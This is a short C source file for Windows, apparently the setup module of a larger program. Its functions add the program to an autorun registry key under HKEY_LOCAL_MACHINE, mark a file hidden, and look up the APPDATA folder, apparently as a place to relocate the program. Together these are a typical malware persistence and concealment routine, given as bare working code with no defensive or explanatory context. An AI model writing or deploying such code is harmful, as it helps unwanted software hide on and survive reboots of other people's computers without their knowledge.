#include "setup.h"

BOOL setAutoRun(CONST CHAR *currPath, CONST CHAR *nameProg){
    HKEY key = NULL;
    if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, AUTORUN, 0, KEY_WRITE, &key) == ERROR_SUCCESS){
        if(RegSetValueEx(key, nameProg, 0, REG_EXPAND_SZ, (BYTE*)currPath, strlen(currPath)) == ERROR_SUCCESS){
            RegCloseKey(key);
            return TRUE;
        }
    }
    return FALSE;
}

BOOL setHidden(CONST CHAR *path){
    DWORD attr = 0;
    attr = GetFileAttributesA(path);
    if(attr & FILE_ATTRIBUTE_HIDDEN)
        return TRUE;
    attr |= FILE_ATTRIBUTE_HIDDEN;
    return SetFileAttributes(path, attr);
}

INT getNewPath(CHAR *newPath, DWORD size){
    DWORD len = 0;
    len = GetEnvironmentVariable("appdata", newPath, size);
    return len;
}
